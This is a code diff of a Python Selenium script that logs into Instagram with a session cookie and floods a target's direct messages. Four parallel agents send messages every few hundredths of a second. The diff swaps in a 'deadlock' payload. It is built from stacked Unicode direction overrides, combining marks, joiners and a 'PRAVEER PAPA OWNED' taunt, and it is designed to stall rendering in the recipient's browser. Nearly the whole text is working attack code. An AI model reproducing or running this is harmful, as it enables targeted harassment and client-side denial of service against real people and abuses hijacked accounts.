@@ -1,6 +1,6 @@
 # -*- coding: utf-8 -*-
-# 🚀 PROJECT: PRAVEER.OWNS (UNIQUE-NUCLEAR V82)
-# 📅 STATUS: CACHE-SHATTER-ACTIVE | 4-AGENT TOTAL | AWS-HARD-KILL
+# 🚀 PROJECT: PRAVEER.OWNS (INPUT-DEADLOCK V83)
+# 📅 STATUS: FRAME-STALL-ACTIVE | 4-AGENT TOTAL | AWS-CPU-MAX
 
 import os, time, re, random, datetime, threading, sys, gc, tempfile, subprocess, shutil
 from concurrent.futures import ThreadPoolExecutor
@@ -12,7 +12,7 @@ from selenium.webdriver.chrome.options import Options
 # --- ⚡ QUAD-VELOCITY CONFIG ---
 AGENTS_PER_MACHINE = 4             
 TOTAL_DURATION = 25000 
-BURST_SPEED = (0.01, 0.05)  # 🔥 MAXIMUM VELOCITY
+BURST_SPEED = (0.01, 0.05)  # 🔥 MAXIMUM VELOCITY DISPATCH
 REST_AFTER_STRIKES = 600   
 REST_DURATION = 1          
 
@@ -20,29 +20,26 @@ GLOBAL_SENT = 0
 COUNTER_LOCK = threading.Lock()
 BROWSER_LAUNCH_LOCK = threading.Lock()
 
-def get_unique_nuclear_payload():
-    """Generates a mathematically unique payload to prevent browser caching."""
-    u_id = random.randint(100000, 999999)
-    # Mixing different high-plane scripts to force the shaper to switch fonts
-    # 𒀱 = Cuneiform | ﷽ = Arabic Wide | ⠟ = Braille
-    scripts = ["𒀱", "﷽", "𒈙", "⠟", "⡇", "🌙", "👑", "🔥"]
-    random.shuffle(scripts)
-    
-    # Directional Isolates for Z-axis lag
-    lri, rli, pdi = "\u2066", "\u2067", "\u2069"
-    # 120 Stacking marks to overflow HarfBuzz
+def get_deadlock_payload():
+    """Generates a payload that forces a Layout-Shift loop in the opponent's browser."""
+    u_id = random.randint(1000, 9999)
+    # \u202E = RLO | \u202D = LRO (Forces direction re-calculation)
+    # \u034F = CGJ (Prevents layout optimization)
+    # \u200D = ZWJ (Forces ligature shaping)
+    rlo, lro, cgj, zwj = "\u202E", "\u202D", "\u034F", "\u200D"
     marks = "".join([chr(i) for i in range(0x0300, 0x036F)]) 
-    glue = "\u2060"
+    glue = "\u2060" # Word Joiner
     
     header = f"👑 PRAVEER PAPA 👑 SYSTEM ERROR [{u_id}]"
     
     body = []
-    # 300 lines of unique layout data
-    for i in range(300):
-        # Every line has a different directional nest and character sequence
-        # This makes 'String Interning' impossible for the browser
-        line = f"{lri}{rli}{random.choice(scripts)}{marks}{pdi*2}"
-        body.append(f"{line} DEVEL OWNED {i}{glue*3}")
+    # 400 lines of mathematically 'Undefined' cursor logic
+    for i in range(400):
+        # Every word forces a direction flip AND a ligature check.
+        # This prevents the browser from using its "Simple Path" renderer.
+        nest = f"{rlo}{marks}{lro}{marks}{cgj}{zwj*4}"
+        line = f"{nest}PRAVEER{glue}PAPA{glue}OWNED{cgj}🌙{i}{glue*5}"
+        body.append(line)
         
     return f"{header}\n{glue.join(body)}".strip()[:9998]
 
@@ -63,7 +60,7 @@ def get_driver(agent_id):
         return driver
 
 def atomic_dispatch_send(driver, text):
-    """Direct DOM injection bypassing the UI priority queue."""
+    """Direct DOM injection that triggers React/Blink state invalidation."""
     try:
         driver.execute_script("""
             var box = document.querySelector('div[role="textbox"], textarea');
@@ -72,7 +69,11 @@ def atomic_dispatch_send(driver, text):
                 document.execCommand('selectAll', false, null);
                 document.execCommand('delete', false, null);
                 document.execCommand('insertText', false, arguments[0]);
+                
+                // Force multiple events to trigger Framework re-sync
                 box.dispatchEvent(new Event('input', { bubbles: true }));
+                box.dispatchEvent(new Event('change', { bubbles: true }));
+                
                 var e = new KeyboardEvent('keydown', {
                     key: 'Enter', code: 'Enter', keyCode: 13, which: 13, 
                     bubbles: true, cancelable: true
@@ -90,19 +91,19 @@ def run_life_cycle(agent_id, cookie, target):
             driver.get("https://www.instagram.com/")
             driver.add_cookie({'name': 'sessionid', 'value': cookie.strip(), 'path': '/', 'domain': '.instagram.com'})
             driver.get(f"https://www.instagram.com/direct/t/{target}/")
-            time.sleep(15) 
+            time.sleep(12) 
             
             strike_count = 0
             while True:
-                payload = get_unique_nuclear_payload()
+                payload = get_deadlock_payload()
                 if atomic_dispatch_send(driver, payload):
                     strike_count += 1
                     with COUNTER_LOCK:
                         global GLOBAL_SENT
                         GLOBAL_SENT += 1
-                    print(f"Agent {agent_id}: Unique-Strike ({GLOBAL_SENT})")
+                    print(f"Agent {agent_id}: Deadlock-Strike ({GLOBAL_SENT})")
                     
-                    if strike_count % 150 == 0:
+                    if strike_count % 100 == 0:
                         driver.refresh()
                         time.sleep(5)
                 time.sleep(random.uniform(*BURST_SPEED))
